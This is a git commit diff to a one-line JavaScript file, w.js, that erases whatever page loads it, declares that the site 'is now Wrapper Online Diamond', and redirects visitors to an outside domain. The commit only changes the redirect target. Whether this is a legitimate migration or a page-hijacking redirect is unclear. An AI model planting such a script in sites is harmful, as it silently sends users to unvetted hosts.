17afb32b915e9dc5572bafc40efb2775305b2efe
Player244_New Enterprises Inc POE. <mrmana341@gmail.com>
2024-09-19 19:08:29 -0700

    Update w.js

--- w.js
+++ w.js
@@ -1,1 +1,1 @@
-document.open();document.write(window.location.hostname+" is now Wrapper Online Diamond. Redirecting...");window.location.replace("http://wrapperonlinediamond.waterdroprio.cc/");
+document.open();document.write(window.location.hostname+" is now Wrapper Online Diamond. Redirecting...");window.location.replace("http://wrapperonlinediamond.waterdroprio.pp.ua/");
